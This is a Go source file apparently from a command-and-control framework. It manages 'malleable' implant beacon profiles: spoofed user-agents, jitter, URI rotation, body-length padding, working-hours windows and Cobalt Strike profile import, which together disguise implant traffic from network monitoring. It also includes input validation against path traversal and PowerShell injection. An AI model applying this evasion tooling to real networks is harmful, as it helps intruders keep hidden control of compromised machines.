package payload

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"

	"github.com/forgec2/forgec2/internal/malleable"
)

func defaultMalleableProfile() MalleableProfile {
	return MalleableProfile{
		Name:      "default",
		UserAgent: defaultWindowsUA,
		BeaconURI: defaultBeaconURI,
		Method:    "POST",
		Headers: map[string]string{
			"Accept":          "*/*",
			"Accept-Language": "en-US,en;q=0.9",
			"Accept-Encoding": "gzip, deflate, br",
		},
		Sleep:               15,
		Jitter:              30,
		ContentLengthJitter: 512,
		JitterURI:           true,
	}
}

// UsesManualProfileSettings reports whether heartbeat/UA should come from the generate form.
func UsesManualProfileSettings(profile string) bool {
	return profile == "" || profile == "default"
}

func profileDataPath(dataDir, name string) string {
	if dataDir == "" {
		dataDir = "data"
	}
	sanitized := profileNameSanitizer.ReplaceAllString(strings.TrimSpace(name), "_")
	return filepath.Join(dataDir, "profiles", sanitized+".json")
}

func parseMalleableProfileJSON(data []byte, fallbackName string) MalleableProfile {
	var p MalleableProfile
	if err := json.Unmarshal(data, &p); err != nil {
		p = defaultMalleableProfile()
		if fallbackName != "" {
			p.Name = fallbackName
		}
		return p
	}
	if p.Name == "" {
		p.Name = fallbackName
	}
	if p.BeaconURI == "" {
		p.BeaconURI = defaultBeaconURI
	}
	if p.Method == "" {
		p.Method = "POST"
	}
	return p
}

// loadMalleableProfile loads a profile from data dir, embedded FS, or falls back to default.
func loadMalleableProfile(name string, dataDir string) MalleableProfile {
	if name == "" {
		name = "default"
	}
	// Sanitize the profile name so a request like "../../config" cannot escape
	// the profiles directory via path traversal (same guard used by
	// DeleteProfile / SaveProfile).
	name = profileNameSanitizer.ReplaceAllString(strings.TrimSpace(name), "_")
	if data, err := os.ReadFile(profileDataPath(dataDir, name)); err == nil {
		return parseMalleableProfileJSON(data, name)
	}
	profilePath := fmt.Sprintf("profiles/%s.json", name)
	if data, err := payloadFS.ReadFile(profilePath); err == nil {
		return parseMalleableProfileJSON(data, name)
	}
	p := defaultMalleableProfile()
	p.Name = name
	return p
}

// NormalizeImplantConfig applies profile rules:
// - default profile: keep manual interval/jitter/UA from the form
// - other/imported profiles: force interval/jitter/UA from the profile
func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile {
	if cfg.C2URL == "" {
		cfg.C2URL = "http://127.0.0.1:8080"
	}
	if cfg.Protocol == "" {
		cfg.Protocol = "http"
	}
	// Win7Compat forces the light profile: fewer dependencies to repin for
	// the go1.20 line, and grpc/quic never worked on those targets anyway.
	if cfg.Win7Compat {
		cfg.Slim = true
	}

	profile := loadMalleableProfile(cfg.Profile, dataDir)
	cfg.BeaconURI = profile.BeaconURI
	cfg.Method = profile.Method
	// WebSocket builds must hit the server's WS upgrade path: the HTTP beacon
	// route is never upgraded, so a WSS build that keeps the default HTTP URI
	// would fail every handshake and silently slide back to HTTPS POST. Map
	// the default here (agent-side aliasing covers config_push overrides);
	// profiles that explicitly set a custom beacon_uri are honored as-is.
	if cfg.BeaconTransport == "wss" && (cfg.BeaconURI == "" || cfg.BeaconURI == defaultBeaconURI) {
		cfg.BeaconURI = defaultWSBeaconURI
	}
	// Carry the malleable response wrapping (prepend/append) into the config
	// blob so the agent can strip it on HTTP replies. Explicit per-build
	// values win over the profile file.
	if cfg.MalleablePrepend == "" {
		cfg.MalleablePrepend = profile.Prepend
	}
	if cfg.MalleableAppend == "" {
		cfg.MalleableAppend = profile.Append
	}
	if cfg.MalleableRequestPrepend == "" {
		cfg.MalleableRequestPrepend = profile.RequestPrepend
	}
	if cfg.MalleableRequestAppend == "" {
		cfg.MalleableRequestAppend = profile.RequestAppend
	}
	if cfg.MalleableRequestHeaders == nil {
		cfg.MalleableRequestHeaders = profile.RequestHeaders
	}
	// v2 chains: explicit per-build wins, else profile file.
	// NOTE: ServerOutput is intentionally NOT auto-activated from the profile
	// file: the agent would decode every response while the server only
	// encodes when the global malleable preset matches, which would break
	// beacons. ServerOutput activates via global preset (NetworkConfig) or
	// explicit per-build override. Client chains are stored (audit/preview)
	// but request encoding still uses prepend/append until placement lands.
	if cfg.MalleableClientMetadata == "" {
		cfg.MalleableClientMetadata = profile.ClientMetadata
	}
	if cfg.MalleableClientID == "" {
		cfg.MalleableClientID = profile.ClientID
	}
	if cfg.Placements == "" {
		cfg.Placements = profile.Placements
	}
	if len(cfg.UserAgents) == 0 {
		cfg.UserAgents = append([]string{}, profile.UserAgents...)
	}
	if !cfg.JitterURI {
		cfg.JitterURI = profile.JitterURI
	}
	if len(cfg.ParameterNames) == 0 {
		cfg.ParameterNames = append([]string{}, profile.ParameterNames...)
	}
	// Working-hours window: explicit per-build form > profile > server
	// default (implant.default_working_*).
	if cfg.WorkingStart == "" {
		cfg.WorkingStart = profile.WorkStart
	}
	if cfg.WorkingStart == "" {
		cfg.WorkingStart = cfg.DefaultWorkingStart
	}
	if cfg.WorkingEnd == "" {
		cfg.WorkingEnd = profile.WorkEnd
	}
	if cfg.WorkingEnd == "" {
		cfg.WorkingEnd = cfg.DefaultWorkingEnd
	}
	if cfg.WorkingTZ == "" {
		cfg.WorkingTZ = profile.WorkTZ
	}
	if cfg.WorkingTZ == "" {
		cfg.WorkingTZ = cfg.DefaultWorkingTZ
	}
	if len(cfg.BeaconURIs) == 0 {
		cfg.BeaconURIs = append(append([]string{}, profile.BeaconURIs...), profile.URIs...)
	}
	if cfg.Parameter == "" {
		cfg.Parameter = profile.Parameter
	}
	if cfg.ContentLengthJitter == 0 && profile.ContentLengthJitter > 0 {
		cfg.ContentLengthJitter = profile.ContentLengthJitter
	}
	// Startup delay window: sanitize (negatives off, cap 600s, min<=max).
	if cfg.StartDelayMin < 0 {
		cfg.StartDelayMin = 0
	}
	if cfg.StartDelayMax < 0 {
		cfg.StartDelayMax = 0
	}
	if cfg.StartDelayMin > 600 {
		cfg.StartDelayMin = 600
	}
	if cfg.StartDelayMax > 600 {
		cfg.StartDelayMax = 600
	}
	if cfg.StartDelayMax > 0 && cfg.StartDelayMin > cfg.StartDelayMax {
		cfg.StartDelayMin = cfg.StartDelayMax
	}
	// Prefer first v2 URI as primary when profile sets multi-URI.
	if len(cfg.BeaconURIs) > 0 && cfg.BeaconURIs[0] != "" {
		// Only override when the legacy single URI is default/empty so
		// existing single-URI profiles keep exact behavior.
		if cfg.BeaconURI == "" || cfg.BeaconURI == defaultBeaconURI {
			cfg.BeaconURI = cfg.BeaconURIs[0]
		}
	}

	if UsesManualProfileSettings(cfg.Profile) {
		if cfg.Interval < 0 {
			cfg.Interval = 5
		}
		if cfg.Jitter == 0 {
			cfg.Jitter = 20
		}
		cfg.Interval, cfg.Jitter = clampBeaconTiming(cfg.Interval, cfg.Jitter)
		if cfg.UserAgent == "" {
			if profile.UserAgent != "" {
				cfg.UserAgent = profile.UserAgent
			} else {
				cfg.UserAgent = defaultWindowsUA
			}
		}
		return profile
	}

	if profile.Sleep > 0 {
		cfg.Interval = profile.Sleep
	} else if cfg.Interval == 0 {
		cfg.Interval = 5
	}
	cfg.Jitter = profile.Jitter
	cfg.Interval, cfg.Jitter = clampBeaconTiming(cfg.Interval, cfg.Jitter)
	if profile.UserAgent != "" {
		cfg.UserAgent = profile.UserAgent
	} else {
		cfg.UserAgent = defaultWindowsUA
	}
	// Body-length jitter is bounded so the padded frame can never trip the
	// server's raw-body size guards (padding is stripped before envelope
	// decode, but the transport-level limit is checked on the raw bytes).
	if cfg.ContentLengthJitter < 0 {
		cfg.ContentLengthJitter = 0
	}
	if cfg.ContentLengthJitter > 4096 {
		cfg.ContentLengthJitter = 4096
	}
	return profile
}

// clampBeaconTiming bounds interval/jitter to sane ranges so a misconfigured
// (or attacker-influenced) profile can never produce a negative sleep that
// would panic time.NewTimer or trigger a beacon storm. Jitter is clamped to
// [0,100]% and interval to [1,86400]s.
func clampBeaconTiming(interval, jitter int) (int, int) {
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 100 {
		jitter = 100
	}
	if interval < 1 {
		interval = 1
	}
	if interval > 86400 {
		interval = 86400
	}
	return interval, jitter
}

// ListProfilePresets returns built-in and imported profile metadata for the generate UI.
func ListProfilePresets(dataDir string) []MalleableProfile {
	seen := map[string]bool{}
	var out []MalleableProfile

	if entries, err := payloadFS.ReadDir("profiles"); err == nil {
		names := make([]string, 0, len(entries))
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
				continue
			}
			names = append(names, strings.TrimSuffix(e.Name(), ".json"))
		}
		sort.Strings(names)
		for _, name := range names {
			p := loadMalleableProfile(name, dataDir)
			out = append(out, p)
			seen[name] = true
		}
	}

	customDir := filepath.Join(dataDir, "profiles")
	if entries, err := os.ReadDir(customDir); err == nil {
		names := make([]string, 0, len(entries))
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
				continue
			}
			name := strings.TrimSuffix(e.Name(), ".json")
			if seen[name] {
				continue
			}
			names = append(names, name)
		}
		sort.Strings(names)
		for _, name := range names {
			p := loadMalleableProfile(name, dataDir)
			out = append(out, p)
		}
	}
	return out
}

// profileFieldSafe rejects characters that would let a crafted profile break
// out of a double-quoted PowerShell string (or run $(...) subexpressions) once
// its fields are injected into the PowerShell agent template. Imported profiles
// are operator-supplied and must never be able to poison downstream builds.
func profileFieldSafe(s string) bool {
	if strings.ContainsAny(s, "`\"$") {
		return false
	}
	if strings.Contains(s, "{{") || strings.Contains(s, "}}") {
		return false
	}
	for _, r := range s {
		if r < 0x20 && r != '\t' {
			return false
		}
		if r == 0x7f {
			return false
		}
	}
	return true
}

// validateMalleableProfile ensures no field can be used to inject PowerShell
// when the profile is later baked into a PS1 agent.
func validateMalleableProfile(p MalleableProfile) error {
	if !profileFieldSafe(p.Name) {
		return fmt.Errorf("profile name contains invalid characters")
	}
	if !profileFieldSafe(p.Description) {
		return fmt.Errorf("profile description contains invalid characters")
	}
	if !profileFieldSafe(p.UserAgent) {
		return fmt.Errorf("user_agent contains invalid characters (quote, backtick, or $)")
	}
	if !profileFieldSafe(p.BeaconURI) {
		return fmt.Errorf("beacon_uri contains invalid characters")
	}
	for _, u := range append(append([]string{}, p.BeaconURIs...), p.URIs...) {
		if !profileFieldSafe(u) {
			return fmt.Errorf("beacon_uris contains invalid characters")
		}
		if u != "" && !strings.HasPrefix(u, "/") {
			return fmt.Errorf("uri %q must start with /", u)
		}
	}
	if !profileFieldSafe(p.Method) {
		return fmt.Errorf("method contains invalid characters")
	}
	if up := strings.ToUpper(strings.TrimSpace(p.Method)); p.Method != "" && up != "GET" && up != "POST" {
		return fmt.Errorf("method must be GET or POST")
	}
	for k, v := range p.Headers {
		if !profileFieldSafe(k) || !profileFieldSafe(v) {
			return fmt.Errorf("header %q contains invalid characters", k)
		}
	}
	for _, s := range []string{p.Prepend, p.Append, p.RequestPrepend, p.RequestAppend, p.ClientMetadata, p.ClientID, p.ServerOutput, p.Parameter, p.Placements} {
		if !profileFieldSafe(s) {
			return fmt.Errorf("transform/wrap field contains invalid characters")
		}
	}
	if strings.TrimSpace(p.Placements) != "" {
		var pls []malleable.PlacementV2
		if err := json.Unmarshal([]byte(p.Placements), &pls); err != nil {
			return fmt.Errorf("placements must be a JSON array of {target, chain}")
		}
		tmp := &malleable.ProfileV2{Name: "validate", Placements: pls}
		if err := malleable.ValidateProfileV2(tmp); err != nil {
			return err
		}
	}
	for _, ua := range p.UserAgents {
		if !profileFieldSafe(ua) {
			return fmt.Errorf("user_agents contains invalid characters")
		}
	}
	for _, w := range []string{p.WorkStart, p.WorkEnd, p.WorkTZ} {
		if !profileFieldSafe(w) {
			return fmt.Errorf("work window contains invalid characters")
		}
	}
	for k, v := range p.RequestHeaders {
		if !profileFieldSafe(k) || !profileFieldSafe(v) {
			return fmt.Errorf("request header %q contains invalid characters", k)
		}
	}
	if p.Sleep < 0 || p.Sleep > 86400 {
		return fmt.Errorf("sleep must be 0..86400")
	}
	if p.Jitter < 0 || p.Jitter > 100 {
		return fmt.Errorf("jitter must be 0..100")
	}
	if p.ContentLengthJitter < 0 || p.ContentLengthJitter > 4096 {
		return fmt.Errorf("content_length_jitter must be 0..4096")
	}
	return nil
}

// SaveImportedProfile stores a user-uploaded profile under data/profiles/.
// It accepts v1/v2 JSON and full Cobalt Strike .profile text (http-get blocks).
func SaveImportedProfile(dataDir string, raw []byte) (MalleableProfile, error) {
	trimmed := strings.TrimSpace(string(raw))
	if looksLikeCSProfile(trimmed) {
		v2, err := malleableParseCSFallback(trimmed)
		if err != nil {
			return MalleableProfile{}, err
		}
		return saveMalleableV2(dataDir, v2)
	}
	p := parseMalleableProfileJSON(raw, "")
	if p.Name == "" {
		// Try v2 migration path (beacon_uris / chains).
		if v2, err := malleableMigrateFallback(raw, ""); err == nil && v2.Name != "" {
			return saveMalleableV2(dataDir, v2)
		}
		return p, fmt.Errorf("profile name is required")
	}
	if err := validateMalleableProfile(p); err != nil {
		return p, err
	}
	p.Name = profileNameSanitizer.ReplaceAllString(strings.TrimSpace(p.Name), "_")
	if p.Name == "" {
		return p, fmt.Errorf("invalid profile name")
	}
	if dataDir == "" {
		dataDir = "data"
	}
	dir := filepath.Join(dataDir, "profiles")
	if err := os.MkdirAll(dir, 0750); err != nil {
		return p, err
	}
	p.Name = strings.TrimPrefix(p.Name, "default_")
	if p.Name == "default" {
		return p, fmt.Errorf("cannot override built-in default profile")
	}
	out, err := json.MarshalIndent(p, "", "  ")
	if err != nil {
		return p, err
	}
	if err := os.WriteFile(filepath.Join(dir, p.Name+".json"), out, 0644); err != nil {
		return p, err
	}
	return p, nil
}

func marshalPlacements(pls []malleable.PlacementV2) string {
	if len(pls) == 0 {
		return ""
	}
	out, err := json.Marshal(pls)
	if err != nil {
		return ""
	}
	return string(out)
}

func looksLikeCSProfile(s string) bool {
	low := strings.ToLower(s)
	return strings.Contains(low, "http-get") || strings.Contains(low, "http-post") || strings.Contains(low, "http-config")
}

func malleableMigrateFallback(raw []byte, fallback string) (*malleable.ProfileV2, error) {
	return malleable.MigrateProfileJSON(raw, fallback)
}

func malleableParseCSFallback(text string) (*malleable.ProfileV2, error) {
	name := "imported"
	// Try to extract set name-like first line? CS profiles rarely carry a name; keep generic.
	return malleable.ParseCSFull(name, text)
}

func saveMalleableV2(dataDir string, v2 *malleable.ProfileV2) (MalleableProfile, error) {
	p := MalleableProfile{
		Name: v2.Name, Description: v2.Description, UserAgent: v2.UserAgent,
		BeaconURI: v2.PrimaryURI(), Method: v2.PrimaryMethod(), Headers: v2.Headers,
		Sleep: v2.Sleep, Jitter: v2.Jitter, Prepend: v2.Prepend, Append: v2.Append,
		RequestPrepend: v2.RequestPrepend, RequestAppend: v2.RequestAppend,
		RequestHeaders: v2.RequestHeaders, BeaconURIs: v2.BeaconURIs, URIs: v2.URIs,
		ClientMetadata:      malleable.StepsToWire(v2.ClientMetadata),
		ClientID:            malleable.StepsToWire(v2.ClientID),
		ServerOutput:        malleable.StepsToWire(v2.ServerOutput),
		Placements:          marshalPlacements(v2.Placements),
		ContentLengthJitter: v2.ContentLengthJitter, JitterURI: v2.JitterURI,
		JitterParameter: v2.JitterParameter, Parameter: v2.Parameter,
		ParameterNames: v2.ParameterNames, UserAgents: v2.UserAgents,
		WorkStart: v2.WorkStart, WorkEnd: v2.WorkEnd, WorkTZ: v2.WorkTZ,
	}
	if err := validateMalleableProfile(p); err != nil {
		return p, err
	}
	if dataDir == "" {
		dataDir = "data"
	}
	dir := filepath.Join(dataDir, "profiles")
	if err := os.MkdirAll(dir, 0750); err != nil {
		return p, err
	}
	p.Name = profileNameSanitizer.ReplaceAllString(strings.TrimSpace(p.Name), "_")
	p.Name = strings.TrimPrefix(p.Name, "default_")
	if p.Name == "" || p.Name == "default" {
		return p, fmt.Errorf("cannot override built-in default profile")
	}
	out, err := json.MarshalIndent(p, "", "  ")
	if err != nil {
		return p, err
	}
	if err := os.WriteFile(filepath.Join(dir, p.Name+".json"), out, 0644); err != nil {
		return p, err
	}
	return p, nil
}

// DeleteProfile removes a custom profile JSON from data/profiles/.
func DeleteProfile(dataDir string, name string) error {
	if dataDir == "" {
		dataDir = "data"
	}
	sanitized := profileNameSanitizer.ReplaceAllString(strings.TrimSpace(name), "_")
	if sanitized == "" || sanitized == "default" {
		return fmt.Errorf("cannot delete default profile")
	}
	path := filepath.Join(dataDir, "profiles", sanitized+".json")
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return fmt.Errorf("profile not found")
	}
	return os.Remove(path)
}
